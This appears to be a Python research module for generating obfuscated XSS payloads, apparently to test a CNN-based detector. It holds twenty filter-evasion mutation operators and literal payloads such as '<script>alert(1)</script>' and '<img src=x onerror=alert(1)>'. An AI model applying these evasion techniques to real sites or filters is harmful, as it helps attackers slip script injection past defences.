from __future__ import annotations
from typing import Callable, List, Tuple
import random, re, urllib.parse

MutOp = Callable[[str, random.Random], str]

# ---- helpers ----
KW_PATTERN = re.compile(r"(script|on\w+|href|alert|confirm|prompt)", re.I)
def enc_hex(s: str) -> str:  return "".join([f"\\x{ord(c):02x}" for c in s])
def enc_dec(s: str) -> str:  return "".join([f"&#{ord(c)};" for c in s])
def case_shuffle(s: str, rng: random.Random) -> str:
    return "".join(c.upper() if rng.random()<0.5 else c.lower() for c in s)

# ---- a0 ~ a19 ----
def op_encode_chars(s: str, rng: random.Random) -> str:
    choice = rng.choice(["url","unicode","html"])
    if choice=="url":    return urllib.parse.quote(s, safe="")
    if choice=="unicode":return KW_PATTERN.sub(lambda m: "".join([f"\\u{ord(c):04x}" for c in m.group(0)]), s)
    return (s.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
             .replace('"',"&quot;").replace("'","&#x27;"))

def op_to_hexadecimal(s: str, rng: random.Random) -> str:
    return KW_PATTERN.sub(lambda m: enc_hex(m.group(0)), s)

def op_to_decimal(s: str, rng: random.Random) -> str:
    return KW_PATTERN.sub(lambda m: enc_dec(m.group(0)), s)

def op_insert_comment(s: str, rng: random.Random) -> str:
    return KW_PATTERN.sub(lambda m: m.group(0)[:len(m.group(0))//2] + "/*x*/" + m.group(0)[len(m.group(0))//2:], s)

def op_insert_tab(s: str, rng: random.Random) -> str:
    return re.sub(r"=", "\t=\t", s)

def op_insert_nullbyte(s: str, rng: random.Random) -> str:
    return KW_PATTERN.sub(lambda m: m.group(0)[:3] + "%00" + m.group(0)[3:], s)

def op_insert_enter(s: str, rng: random.Random) -> str:
    return re.sub(r"=", "\r\n=\r\n", s)

def op_add_script_tag(s: str, rng: random.Random) -> str:
    return s + "<script>alert(1)</script>"

def op_double_keywords(s: str, rng: random.Random) -> str:
    return KW_PATTERN.sub(lambda m: m.group(0)*2, s)

def op_case_obfuscation(s: str, rng: random.Random) -> str:
    return case_shuffle(s, rng)

def op_replace_with_media_tag(s: str, rng: random.Random) -> str:
    return re.sub(r"<\s*script[^>]*>", "<img src=x onerror=alert(1)>", s, flags=re.I) if "<" in s else s + "<img src=x onerror=alert(1)>"

def op_add_special_tail(s: str, rng: random.Random) -> str:
    return s + rng.choice(["<!--", "'", '"'])

def op_insert_fake_link(s: str, rng: random.Random) -> str:
    return s + '"><a href=#>x</a>'

def op_spaces_to_slash(s: str, rng: random.Random) -> str:
    return re.sub(r"\s+", rng.choice(["/", "//"]), s)

def op_replace_popup_unit(s: str, rng: random.Random) -> str:
    return re.sub(r"alert\s*\(", "confirm(", s, flags=re.I)

def op_append_comment_end(s: str, rng: random.Random) -> str:
    return s + "/*--*/"

def op_add_backslash(s: str, rng: random.Random) -> str:
    return s.replace("<","\\<").replace(">","\\>").replace('"','\\"').replace("'","\\'")

def op_add_special_tags_before(s: str, rng: random.Random) -> str:
    return rng.choice([">","/>",";"]) + s

def op_insert_ctrl_into_kw(s: str, rng: random.Random) -> str:
    return KW_PATTERN.sub(lambda m: m.group(0)[:3] + rng.choice(["%09","%00","%0a%0d"]) + m.group(0)[3:], s)

def op_paren_to_backticks(s: str, rng: random.Random) -> str:
    s = re.sub(r"\(", "`", s);  s = re.sub(r"\)", "`", s)
    return s

# ---- registry（照論文順序）----
REGISTRY: List[Tuple[str, str, MutOp]] = [
    ("encode_chars",            "a0 字元編碼(URL/Unicode/HTML)",        op_encode_chars),
    ("to_hexadecimal",          "a1 轉十六進位(\\x..)",                  op_to_hexadecimal),
    ("to_decimal",              "a2 轉十進位HTML實體",                   op_to_decimal),
    ("insert_comment",          "a3 關鍵字中插註解",                      op_insert_comment),
    ("insert_tab",              "a4 插入Tab",                             op_insert_tab),
    ("insert_nullbyte",         "a5 插入Null/0x30",                       op_insert_nullbyte),
    ("insert_enter",            "a6 插入Enter(\\r\\n)",                   op_insert_enter),
    ("add_script_tag",          "a7 追加<script>...</script>",            op_add_script_tag),
    ("double_keywords",         "a8 關鍵字重複",                          op_double_keywords),
    ("case_obfuscation",        "a9 大小寫混排",                          op_case_obfuscation),
    ("replace_with_media_tag",  "a10 以媒體/其他標籤替換",                 op_replace_with_media_tag),
    ("add_special_tail",        "a11 結尾加特殊符號",                     op_add_special_tail),
    ("insert_fake_link",        "a12 插入假連結/屬性",                    op_insert_fake_link),
    ("spaces_to_slash",         "a13 空白轉斜線",                         op_spaces_to_slash),
    ("replace_popup_unit",      "a14 將 alert 換 confirm/prompt",         op_replace_popup_unit),
    ("append_comment_end",      "a15 結尾加註解",                         op_append_comment_end),
    ("add_backslash",           "a16 加反斜線逃脫",                       op_add_backslash),
    ("add_special_before",      "a17 在前方加 >,/> ,;",                   op_add_special_tags_before),
    ("insert_ctrl_into_kw",     "a18 關鍵字內插入%09/%00/%0a%0d",          op_insert_ctrl_into_kw),
    ("paren_to_backticks",      "a19 括號換反引號",                       op_paren_to_backticks),
]

N_ACTIONS = len(REGISTRY)

# ---- 工具函式 ----
def list_actions() -> List[str]:
    """回傳所有動作名稱（給 cnn_env 用）"""
    return [name for name, _, _ in REGISTRY]


def clean_payload(s: str) -> str:
    """
    清除多餘空白、換行與重複字元。
    在 mutation 後呼叫，確保 payload 整潔。
    """
    # 移除多餘空白與換行
    s = re.sub(r"\s{2,}", " ", s)        # 多個空白壓成一個
    s = re.sub(r"(\r|\n|\t)+", "", s)    # 移除換行/tab
    s = re.sub(r"\s*(<|>|=|\(|\)|;|:|,)\s*", r"\1", s)  # 修剪符號邊緣空白
    return s.strip()
